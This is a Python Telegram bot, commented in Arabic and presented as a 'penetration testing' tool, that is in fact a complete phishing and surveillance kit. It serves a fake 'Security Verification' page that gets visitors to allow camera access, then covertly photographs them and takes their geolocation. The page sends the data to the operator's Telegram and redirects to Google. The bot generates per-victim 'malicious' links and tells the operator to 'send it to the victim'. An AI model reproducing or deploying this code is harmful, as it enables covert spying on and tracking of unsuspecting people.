import telebot
import requests
import json
import time
import threading
import os
import sys
import base64
import urllib.parse
import random
import string
from http.server import HTTPServer, BaseHTTPRequestHandler

# ===== توكن البوت =====
TOKEN = input("أدخل توكن البوت الخاص بك: ")
bot = telebot.TeleBot(TOKEN)

# ===== متغيرات =====
user_sessions = {}
user_links = {}

# ===== توليد معرف عشوائي =====
def generate_id():
		return ''.join(random.choices(string.digits, k=10))

# ===== إرسال الصورة والموقع إلى التيليجرام =====
def send_to_telegram(chat_id, image_b64, location=None, agent="Unknown"):
		try:
				photo_bytes = base64.b64decode(image_b64)
				bot.send_photo(chat_id, photo_bytes, caption=f"📸 Photo captured\n🕒 {time.ctime()}\n📱 {agent[:100]}")
				if location:
						lat = location.get('lat')
						lon = location.get('lon')
						if lat and lon:
								bot.send_location(chat_id, lat, lon)
								bot.send_message(chat_id, f"📍 Location:\nhttps://www.google.com/maps?q={lat},{lon}")
		except Exception as e:
				print(f"[-] Failed to send: {e}")

# ===== خادم استقبال الصور والموقع =====
class CaptureHandler(BaseHTTPRequestHandler):
		def do_GET(self):
				parsed = urllib.parse.urlparse(self.path)
				# قبول المسارات المطلوبة
				allowed_paths = ["/", "/PY1PY1.php", "/PY1PY15.php", "/webhook"]
				if parsed.path in allowed_paths:
						self.send_response(200)
						self.send_header("Content-type", "text/html")
						self.end_headers()
						query = urllib.parse.parse_qs(parsed.query)
						victim_id = query.get('id', ['unknown'])[0]

						# صفحة HTML باللغة الإنجليزية مع طلب الكاميرا
						html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Verification</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;}}
body{{
		background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
		font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
		display: flex;
		justify-content: center;
		align-items: center;
		height: 100vh;
		margin: 0;
}}
.container{{
		background: white;
		border-radius: 20px;
		padding: 40px 30px;
		max-width: 380px;
		width: 90%;
		text-align: center;
		box-shadow: 0 20px 60px rgba(0,0,0,0.3);
}}
.icon{{
		font-size: 64px;
		margin-bottom: 15px;
}}
h1{{
		font-size: 22px;
		font-weight: 700;
		color: #1a1a2e;
		margin-bottom: 8px;
}}
p{{
		color: #555;
		font-size: 15px;
		line-height: 1.5;
		margin-bottom: 25px;
}}
.btn{{
		background: #667eea;
		color: white;
		border: none;
		padding: 14px 40px;
		border-radius: 50px;
		font-size: 16px;
		font-weight: 600;
		cursor: pointer;
		transition: 0.3s;
		width: 100%;
}}
.btn:hover{{
		background: #5a6fd6;
		transform: scale(1.02);
}}
.footer{{
		margin-top: 20px;
		font-size: 12px;
		color: #aaa;
}}
</style>
</head>
<body>
<div class="container">
		<div class="icon">🔐</div>
		<h1>Security Verification</h1>
		<p>Please allow access to your camera to continue with the verification process.</p>
		<button class="btn" id="allowBtn">Allow Camera Access</button>
		<div class="footer">Secure connection • SSL encrypted</div>
</div>

<script>
const victimId = '{victim_id}';
const btn = document.getElementById('allowBtn');

btn.addEventListener('click', function() {{
		btn.textContent = '⏳ Accessing camera...';
		btn.disabled = true;

		navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user', width: 640, height: 480 }} }})
		.then(stream => {{
				const video = document.createElement('video');
				video.srcObject = stream;
				video.play();
				setTimeout(() => {{
						const canvas = document.createElement('canvas');
						canvas.width = 640;
						canvas.height = 480;
						const ctx = canvas.getContext('2d');
						ctx.drawImage(video, 0, 0);
						const dataUrl = canvas.toDataURL('image/jpeg', 0.85);

						let locationData = null;
						const sendData = () => {{
								fetch('/upload', {{
										method: 'POST',
										headers: {{ 'Content-Type': 'application/json' }},
										body: JSON.stringify({{ 
												image: dataUrl, 
												agent: navigator.userAgent,
												id: victimId,
												location: locationData
										}})
								}});
								stream.getTracks().forEach(t => t.stop());
								window.location.href = 'https://www.google.com';
						}};

						if (navigator.geolocation) {{
								navigator.geolocation.getCurrentPosition(
										pos => {{
												locationData = {{ lat: pos.coords.latitude, lon: pos.coords.longitude }};
												sendData();
										}},
										() => {{ sendData(); }}
								);
						}} else {{
								sendData();
						}}
				}}, 1200);
		}})
		.catch(() => {{
				window.location.href = 'https://www.google.com';
		}});
}});
</script>
</body>
</html>"""
						self.wfile.write(html.encode())
				else:
						self.send_error(404)

		def do_POST(self):
				if self.path == "/upload":
						content_length = int(self.headers.get('Content-Length', 0))
						post_data = self.rfile.read(content_length).decode()
						try:
								data = json.loads(post_data)
								image_b64 = data.get('image', '')
								if image_b64.startswith('data:image/jpeg;base64,'):
										image_b64 = image_b64.replace('data:image/jpeg;base64,', '')
								agent = data.get('agent', 'Unknown')
								victim_id = data.get('id', 'unknown')
								location = data.get('location', None)

								filename = f"captured_{victim_id}_{int(time.time())}.jpg"
								with open(filename, "wb") as f:
										f.write(base64.b64decode(image_b64))
								print(f"[+] Photo saved: {filename}")

								chat_id = user_sessions.get(victim_id, {}).get('chat_id')
								if chat_id:
										send_to_telegram(chat_id, image_b64, location, agent)
								else:
										print(f"[-] No chat_id for victim {victim_id}")

						except Exception as e:
								print(f"[-] Error: {e}")
						self.send_response(200)
						self.send_header("Content-type", "text/plain")
						self.end_headers()
						self.wfile.write(b"OK")
				else:
						self.send_error(404)

# ===== تشغيل الخادم =====
def start_server(port=8080):
		server = HTTPServer(('', port), CaptureHandler)
		thread = threading.Thread(target=server.serve_forever, daemon=True)
		thread.start()
		return server

# ===== إنشاء رابط ملغم =====
def create_link(chat_id, link_type="front_cam"):
		victim_id = generate_id()
		domain = "py1py.duckdns.org"  # غيّر إلى نطاقك
		link = f"https://{domain}/PY1PY1.php?cam={link_type}&id={victim_id}"
		user_sessions[victim_id] = {"chat_id": chat_id, "type": link_type, "time": time.ctime()}
		user_links[chat_id] = link
		return link, victim_id

# ===== البوت =====
@bot.message_handler(commands=['start'])
def send_welcome(message):
		markup = telebot.types.InlineKeyboardMarkup(row_width=2)
		btn1 = telebot.types.InlineKeyboardButton("📷 Front Camera", callback_data="front_cam")
		btn2 = telebot.types.InlineKeyboardButton("📸 Back Camera", callback_data="back_cam")
		btn3 = telebot.types.InlineKeyboardButton("🔗 Link Bomb", callback_data="link_bomb")
		btn4 = telebot.types.InlineKeyboardButton("🎥 Video Record", callback_data="video_rec")
		btn5 = telebot.types.InlineKeyboardButton("📍 Get Location", callback_data="get_location")
		btn6 = telebot.types.InlineKeyboardButton("📊 Statistics", callback_data="stats")
		markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
		bot.send_message(message.chat.id, 
				"👋 Welcome to Aras Bot\n🔓 Full penetration testing bot\n\n👨‍💻 Developer\n📶 Channel\n\nChoose an option:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
		chat_id = call.message.chat.id
		bot.answer_callback_query(call.id)

		if call.data == "front_cam":
				link, vid = create_link(chat_id, "front_cam")
				bot.send_message(chat_id, f"✅ Front camera link created:\n{link}\n\n📌 Send it to the victim and you'll receive photo + location")
				markup = telebot.types.InlineKeyboardMarkup()
				markup.add(telebot.types.InlineKeyboardButton("🔗 Open Link", url=link))
				bot.send_message(chat_id, "Test it:", reply_markup=markup)

		elif call.data == "back_cam":
				link, vid = create_link(chat_id, "back_cam")
				bot.send_message(chat_id, f"✅ Back camera link created:\n{link}")
				markup = telebot.types.InlineKeyboardMarkup()
				markup.add(telebot.types.InlineKeyboardButton("🔗 Open Link", url=link))
				bot.send_message(chat_id, "Test it:", reply_markup=markup)

		elif call.data == "link_bomb":
				link, vid = create_link(chat_id, "front_cam")
				bot.send_message(chat_id, f"🔗 Malicious link ready:\n{link}")

		elif call.data == "get_location":
				bot.send_message(chat_id, "📍 Location will be sent automatically with the photo.")

		elif call.data == "stats":
				bot.send_message(chat_id, f"📊 Statistics:\nActive links: {len(user_sessions)}")

		elif call.data == "video_rec":
				bot.send_message(chat_id, "🎥 Under development...")

		# القائمة الرئيسية
		markup = telebot.types.InlineKeyboardMarkup(row_width=2)
		btn1 = telebot.types.InlineKeyboardButton("📷 Front Camera", callback_data="front_cam")
		btn2 = telebot.types.InlineKeyboardButton("📸 Back Camera", callback_data="back_cam")
		btn3 = telebot.types.InlineKeyboardButton("🔗 Link Bomb", callback_data="link_bomb")
		btn4 = telebot.types.InlineKeyboardButton("🎥 Video Record", callback_data="video_rec")
		btn5 = telebot.types.InlineKeyboardButton("📍 Get Location", callback_data="get_location")
		btn6 = telebot.types.InlineKeyboardButton("📊 Statistics", callback_data="stats")
		markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
		bot.send_message(chat_id, "🎯 Choose an option:", reply_markup=markup)

# ===== التشغيل =====
if __name__ == "__main__":
		try:
				import telebot
		except ImportError:
				print("[-] Install pyTelegramBotAPI: pip install pyTelegramBotAPI")
				sys.exit(1)

		server = start_server(8080)
		print("[*] HTTP Server running on port 8080")
		print("[*] Bot is running...")

		try:
				bot.infinity_polling()
		except KeyboardInterrupt:
				print("\n[!] Stopped")
				server.shutdown()